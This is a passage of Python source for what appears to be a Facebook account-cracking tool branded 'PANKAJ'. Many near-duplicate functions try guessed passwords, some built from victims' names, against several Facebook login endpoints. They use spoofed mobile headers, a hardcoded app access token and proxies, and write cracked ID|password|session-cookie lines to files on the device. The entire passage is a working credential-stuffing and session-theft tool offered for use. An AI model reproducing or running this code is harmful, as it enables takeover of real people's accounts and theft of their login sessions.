                'dpr': '2.75',
                'referer': 'https://m.facebook.com/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"2201117TI"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"13.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                'viewport-width': '980',
}

            lo = session.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=headers).text
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print(f" {green}[PANKAJ-OK💚] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
                open("/sdcard/dev_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid+"|"+pw)
                break
            elif "checkpoint" in log_cookies:
                if "Enter login code to continue" in log_cookies:
                    print(f" {cyan}[DEV-2F] {uid}|{pw}")
                    open("/sdcard/dev_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                    twf.append(uid+"|"+pw)
                    break
                else:
                    print(f" {red}[DEV-CP] {uid}|{pw}")
                    open("/sdcard/dev_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                    cps.append(uid+"|"+pw)
                    break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

def bapi(uid, name, pwx, tl):
    global loop
    global oks
    global cps
    sys.stdout.write(f'\r\033[1;97m[PANKAJ-M2] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for ps in pwx:
            pw = ps.replace("first", first).replace("last", last).lower()
            ua = "[FBAN/FB4A;FBAV/221.0.0.48.102;FBBV/154683426;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/Airtel-SA;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            data = {
                "email": uid,
                "password": pw,
                "cpl": "true",
                "credentials_type": "password",
                "error_detail_type": "button_with_disabled",
                "source": "login",
                "format": "json",
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "generate_machine_id": "1",
            }
            headers = {
                "accept-encoding": "gzip, deflate",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "content-type": "application/x-www-form-urlencoded",
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-friendly-name": "authenticate",
                "x-fb-http-engine": "Liger",
                "user-agent": ua,
            }
            url = "https://b-api.facebook.com/method/auth.login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {green}[PANKAJ-OK💚] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
                open("/sdcard/dev_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid+"|"+pw)
                break
            elif result["error_code"] == 405:
                print(f" {red}[DEV-CP] {uid}|{pw}")
                open("/sdcard/dev_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid+"|"+pw)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

def graph(uid, name, pwx, tl):
    global loop
    global oks
    global cps
    sys.stdout.write(f'\r\033[1;97m[PANKAJ-M3] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for ps in pwx:
            pw = ps.replace("first", first).replace("last", last).lower()
            ua = random.choice(devapi)
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {
                'User-Agent': "[FBAN/FB4A;FBAV/221.0.0.48.102;FBBV/154683426;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/Airtel-SA;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            url = "https://graph.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {green}[DEV-OK💚] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
                open("/sdcard/PANKAJ_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid+"|"+pw)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                print(f" {red}[PANKAJ-CP] {uid}|{pw}")
                open("/sdcard/PANKAJ_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid+"|"+pw)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except Exception as e:
        print(e)



def api1(uid,pwx,tl):
    global loop
    global oks
    global cps
    global devua
    sys.stdout.write(f'\r\033[1;97m[PANKAJ-M1] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    try:
        for ps in pwx:
            ua = random.choice(devapi)
            data = {
                'adid': str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':uid,
                'password':ps,
                'generate_analytics_claims':'1',
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'fb_api_req_friendly_name':'authenticate',
            }
            headers={
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name':'authenticate',
                'X-FB-Connection-Type':'unknown',
                'User-Agent': ua,
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print('\33[1;92m[PANKAJ-OK💚] '+uid+' | '+ps+'\33[0;97m')
                print(f"\033[1;93mCOOKIES : {coki}")
                open('/sdcard/PANKAJ-Ok.txt', 'a').write(f'{uid}|{ps}|{coki}\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in po["error"]["message"]:
                try:
                    uid = po["error"]["error_data"]["uid"]
                except:
                    uid = uid
                #print('\33[1;91m[PANKAJ-CP] '+uid+' | '+ps+'\33[0;97m')
                open('/sdcard/PANKAJ-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass
    except:
        pass

def api2(uid,pwx,tl):
    global loop
    global oks
    global cps
    global devua
    try:
        for ps in pwx:
            ua = random.choice(devapi)
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid, 'password': ps,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
            }
            headers = {
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger',
            }
            url = 'https://api.facebook.com/method/auth.login'
            po = requests.post(url, data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in po:
                try:
                    uid = po["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print('\33[1;92m[PANKAJ-OK] '+uid+' | '+ps+'\33[0;97m')
                print(f"\033[1;93mCOOKIES : {coki}")
                open('/sdcard/PANKAJ-Ok.txt', 'a').write(f'{uid}|{ps}|{coki}\n')
                oks.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;97m[PANKAJ-M2] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass
    except:
        pass

def apix(uid,pwx,tl):
    global loop
    global oks
    global cps
    global devua
    try:
        for ps in pwx:
            ua = random.choice(devapi)
            data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':uid,
                'password':pw,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print('\33[1;92m[PANKAJ-OK] '+uid+' | '+ps+'\33[0;97m')
                print(f"\033[1;93mCOOKIES : {coki}")
                open('/sdcard/PANKAJ-Ok.txt', 'a').write(f'{uid}|{ps}|{coki}\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in po["error"]["message"]:
                try:
                    uid = po["error"]["error_data"]["uid"]
                except:
                    uid = uid
                #print('\33[1;91m[PANKAJ-CP] '+uid+' | '+ps+'\33[0;97m')
                open('/sdcard/PANKAJ-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;97m[PANKAJ-M3] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass
    except:
        pass

def mbasic(uid,pwx,tl):
    global loop
    global oks
    global cps
    global devua
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            session = requests.Session()
            pro = random.choice(devua)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":uid,
                "pass":ps,
                "login":"Log In",
            }
            header_freefb = {
                'authority': 'm.facebook.com', 
                'method': 'POST', 
                'scheme': 'https', 
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'dpr': '2.75',
                'referer': 'https://mbasic.facebook.com/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"2201117TI"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"13.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
            }
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\33[1;92m[PANKAJ-OK] '+cid+' | '+ps+'\33[0;97m')
                print(f"\033[1;93mCOOKIES : {coki}")
                open('/sdcard/PANKAJ-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;91m[PANKAJ-CP] '+cid+' | '+ps+'\33[0;97m')
                open('/sdcard/PANKAJ-Cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;97m[PANKAJ-M4] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass
    except:
        pass
        


def p(uid,pwx,tl):
    global loop
    global oks
    global cps
    global devua
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            session = requests.Session()
            pro = random.choice(devua)
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":uid,
                "pass":ps,
                "login":"Log In",
            }
            header_freefb = {
                'authority': 'p.facebook.com',
                'method': 'POST',
                'scheme': 'https', 
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'referer': 'https://p.facebook.com/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"2201117TI"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"13.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
            }
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\33[1;92m[PANKAJ-OK] '+cid+' | '+ps+'\33[0;97m')
                print(f"\033[1;32mCOOKIES : {coki}")
                open('/sdcard/PANKAJ-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;91m[PANKAJ-CP] '+cid+' | '+ps+'\33[0;97m')
                open('/sdcard/PANKAJ-Cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;97m[PANKAJ-M5] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass
    except:
        pass

def x(uid,pwx,tl):
    global loop
    global oks
    global cps
    global devua
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            session = requests.Session()
            pro = random.choice(devua)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":uid,
                "pass":ps,
                "login":"Log In",
            }
            header_freefb = {
                'authority': 'x.facebook.com',
                'method': 'POST',
                'scheme': 'https', 
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'referer': 'https://x.facebook.com/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"2201117TI"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"13.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
            }
            lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\33[1;92m[PANKAJ-OK] '+cid+' | '+ps+'\33[0;97m')
                print(f"\033[1;35mCOOKIES : {coki}")
                open('/sdcard/PANKAJ-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;91m[PANKAJ-CP] '+cid+' | '+ps+'\33[0;97m')
                open('/sdcard/PANKAJ-Cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;97m[PANKAJ-M6] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass
    except:
        pass
        
def mobile(uid,pwx,tl):
    global loop
    global oks
    global cps
    global devua
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            session = requests.Session()
            pro = random.choice(devua)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":uid,
                "pass":ps,
                "login":"Log In",
            }
            header_freefb = {
                'authority': 'p.facebook.com',
                'method': 'POST',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'referer': 'https://p.facebook.com/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
            }
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\33[1;92m[PANKAJ-OK] '+cid+' | '+ps+'\33[0;97m')
                print(f"\033[1;34mCOOKIES : {coki}")
                open('/sdcard/PANKAJ-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;91m[PANKAJ-CP] '+cid+' | '+ps+'\33[0;97m')
                open('/sdcard/PANKAJ-Cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;97m[PANKAJ-M7] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass
    except:
        pass

def freeq(uid,pwx,tl):
    global loop
    global oks
    global cps
    global devua
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            session = requests.Session()
            pro = random.choice(devua)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":uid,
                "pass":ps,
                "login":"Log In",
            }
            header_freefb = {
                'authority': 'https://free.facebook.com', 
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"', 
                'sec-fetch-dest': 'document', 
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
            }
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\33[1;92m[PANKAJ-OK] '+cid+' | '+ps+'\33[0;97m')
                print(f"\033[1;92mCOOKIES : {coki}")
                open('/sdcard/PANKAJ-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;91m[PANKAJ-CP] '+cid+' | '+ps+'\33[0;97m')
                open('/sdcard/PANKAJ-Cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;97m[PANKAJ-M8] %s/%s / OK/CP \033[1;97m%s\033[1;97m/\033[1;91m%s\033[0;97m \r'%(loop,tl,len(oks), len(cps)));sys.stdout.flush()
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass
    except:
        pass

def d(uid,pwx,tl):
    global loop
    global oks
    global cps
    global devua
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            session = requests.Session()
            pro = random.choice(devua)
            free_fb = session.get('https://d.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":uid,
                "pass":ps,
                "login":"Log In",
            }
            header_freefb = {
                'authority': 'x.facebook.com', 
                'method': 'POST', 
                'scheme': 'https', 
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
